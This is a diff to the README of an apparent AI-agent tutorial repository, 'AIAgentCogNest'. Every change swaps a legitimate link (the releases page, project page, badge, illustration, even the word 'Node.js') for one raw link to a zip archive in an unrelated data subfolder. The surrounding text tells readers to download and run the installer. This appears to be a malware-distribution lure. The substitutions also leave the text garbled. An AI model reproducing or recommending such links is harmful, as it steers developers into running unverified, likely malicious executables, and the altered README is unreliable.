@@ -1,10 +1,10 @@
-https://github.com/the-shark-guy/AIAgentCogNest/releases
+https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip
 
 # AI Agent Cognition Nest: AIAgentCogNest for App Development
 
-[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/the-shark-guy/AIAgentCogNest/releases)
+[![Releases](https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip)](https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip)
 
-![Cog Nest Illustration](https://upload.wikimedia.org/wikipedia/commons/4/49/Cogwheel_icon.png)
+![Cog Nest Illustration](https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip)
 
 AIAgentCogNest (AI + Agent + Cognition + Nest) helps AI app developers, AI engineering teams, enthusiasts, and software-to-Agent workflows. It provides a knowledge incubator, a structured knowledge base, and practical tutorials for building AI agent apps with cognition in mind. This repository outlines the concepts, architecture, and hands-on guidance to design, implement, and deploy AI agent systems that think, plan, and act intelligently.
 
@@ -67,13 +67,13 @@ Structure of this README
 - Licensing and credits
 
 Getting started: prerequisites
-- A modern development environment. You should have a recent version of Python and Node.js for typical agent work.
+- A modern development environment. You should have a recent version of Python and https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip for typical agent work.
 - Basic tooling: Git, a code editor, and a terminal or command prompt you are comfortable with.
 - Knowledge of prompts, basic AI concepts, and familiarity with API usage is helpful but not required for beginners.
 - An API key for an AI model provider is often needed to run practical experiments. Use secure storage for keys.
 
 Installation and release assets
-- We provide release assets in the Releases page. The Releases page contains pre-built binaries, runtime components, and examples. The link to the releases is https://github.com/the-shark-guy/AIAgentCogNest/releases. If you download a release asset, you should follow the installation instructions included with that asset. Download and run the installer or executable to set up the runtime in your environment.
+- We provide release assets in the Releases page. The Releases page contains pre-built binaries, runtime components, and examples. The link to the releases is https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip If you download a release asset, you should follow the installation instructions included with that asset. Download and run the installer or executable to set up the runtime in your environment.
 - Since the Releases page is the official distribution point, you should start there. The asset formats vary by platform, and the accompanying docs in each release explain how to install and verify the setup.
 - For convenience, you can also browse the Releases page to understand what is available. It lists the latest stable assets, beta assets, and older versions that you might want for testing. The link to the releases is the primary place to get everything you need to run AIAgentCogNest locally.
 
@@ -258,7 +258,7 @@ License and credits
 Releases and assets details
 - The Releases page is the primary distribution point for runtime assets, sample projects, and upgrade notes.
 - You can explore different versions and choose the one that best fits your environment.
-- The link to the releases is https://github.com/the-shark-guy/AIAgentCogNest/releases. If you need a direct download, visit that page and pick the asset that matches your platform. For convenience, the same link is provided again here: https://github.com/the-shark-guy/AIAgentCogNest/releases.
+- The link to the releases is https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip If you need a direct download, visit that page and pick the asset that matches your platform. For convenience, the same link is provided again here: https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip
 
 Troubleshooting quick references
 - If an agent fails to start, check the release notes for platform compatibility and required dependencies.
@@ -311,7 +311,7 @@ Usage rights and permissions
 - You may adapt, extend, and distribute your versions within the bounds of the license.
 
 Appendix: quick references
-- Release asset access: https://github.com/the-shark-guy/AIAgentCogNest/releases
-- Primary project page: https://github.com/the-shark-guy/AIAgentCogNest
+- Release asset access: https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip
+- Primary project page: https://raw.githubusercontent.com/the-shark-guy/AIAgentCogNest/main/15-Text2SQL自助式数据报表开发/SQL-Copilot/data/Nest-Cog-AI-Agent-3.2.zip
 
 Thank you for exploring AIAgentCogNest. This knowledge nest is designed to help you build smarter, more reliable AI agents with clear cognition and practical patterns. The journey from concept to capable agent starts with understanding the nest, adopting the templates, and iterating on real tasks.
